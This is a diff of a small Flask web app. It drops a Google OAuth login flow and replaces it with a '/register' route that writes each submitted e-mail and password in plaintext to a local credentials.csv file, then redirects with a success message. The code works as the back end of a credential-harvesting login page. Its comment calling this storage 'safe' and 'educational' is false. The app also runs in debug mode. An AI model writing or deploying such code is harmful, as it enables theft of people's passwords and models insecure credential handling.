@@ -1,42 +1,22 @@
-import json
-from flask import Flask, render_template
+from flask import Flask, request, redirect, render_template_string
 
 app = Flask(__name__)
 
-# Load client secrets
-with open('client_secret.json') as f:
-    client_secrets = json.load(f)
-
 @app.route('/')
-def login():
-    # Pass the client ID to the template
-    return render_template('login.html', client_id=client_secrets['web']['client_id'])
+def index():
+    return render_template_string(open('login.html').read())
 
-@app.route('/login', methods=['POST'])
-def traditional_login():
+@app.route('/register', methods=['POST'])
+def register():
     email = request.form['email']
     password = request.form['password']
-    # Here you would implement the logic to check the user credentials
-    return jsonify({'status': 'success', 'message': 'Logged in successfully'})
-
-@app.route('/glogin', methods=['POST'])
-def google_login():
-    # ... your existing code ...
-
-    auth_code = request.json.get('code')
-
-    # Exchange auth code for access token, refresh token, and ID token
-    credentials = {
-        'code': auth_code,
-        'client_id': client_secrets['web']['client_id'],
-        'client_secret': client_secrets['web']['client_secret'],
-        'redirect_uri': 'postmessage',
-        'grant_type': 'authorization_code'
-    }
-
-    # POST request to Google's token URI
-    r = requests.post(client_secrets['web']['token_uri'], data=credentials)
-    token_response = r.json()
+    
+    # Save the credentials safely, this is just for educational purposes
+    with open('credentials.csv', 'a') as file:
+        file.write(f"{email},{password}\n")
+    
+    # Redirect back to home and show the message
+    return redirect('/?message=E-mail and Password registered successfully')
 
 if __name__ == '__main__':
     app.run(debug=True)
